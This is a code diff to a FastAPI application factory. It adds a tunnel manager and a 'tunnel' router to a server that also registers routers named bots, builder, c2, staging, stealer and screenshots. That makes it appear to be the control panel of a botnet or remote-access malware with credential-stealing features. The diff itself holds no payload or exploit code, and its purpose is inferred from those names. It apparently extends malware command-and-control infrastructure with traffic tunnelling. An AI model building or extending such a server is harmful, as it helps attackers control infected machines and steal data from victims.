@@ -54,8 +54,11 @@ def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
     except FileNotFoundError:
         app.state.stateless_crypto = None
 
+    from ..tunnel import TunnelManager
+    app.state.tunnel_manager = TunnelManager()
+
     # Import and include routers
-    from .routers import auth, bots, builder, commands, c2, downloads, screenshots, staging, stealer, ws
+    from .routers import auth, bots, builder, commands, c2, downloads, screenshots, staging, stealer, ws, tunnel
 
     app.include_router(auth.router)
     app.include_router(bots.router)
@@ -67,6 +70,7 @@ def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
     app.include_router(stealer.router)
     app.include_router(ws.router)
     app.include_router(c2.router)
+    app.include_router(tunnel.router)
 
     # Mount static files for web UI
     if WEB_DIR.exists():
